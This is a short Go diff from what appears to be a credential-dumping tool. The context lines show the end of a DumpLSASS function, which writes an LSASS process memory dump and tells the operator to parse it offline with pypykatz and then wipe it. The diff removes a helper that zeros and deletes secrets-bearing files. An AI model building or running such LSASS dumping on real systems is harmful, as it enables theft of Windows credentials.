@@ -103,13 +103,3 @@ func DumpLSASS(pid int, dir string, em Emitter) (string, int64, error) {
 	emit(em, fmt.Sprintf("LSASS: dump written (%d bytes) — parse offline (pypykatz), then wipe", st.Size()), "SUCCESS")
 	return out, st.Size(), nil
 }
-
-// WipeFile zeros and removes a secrets-bearing file (best effort — a
-// journaling FS keeps old blocks until reuse).
-func WipeFile(path string) error {
-	if f, err := os.OpenFile(path, os.O_WRONLY, 0); err == nil {
-		_ = f.Truncate(0)
-		_ = f.Close()
-	}
-	return os.Remove(path)
-}
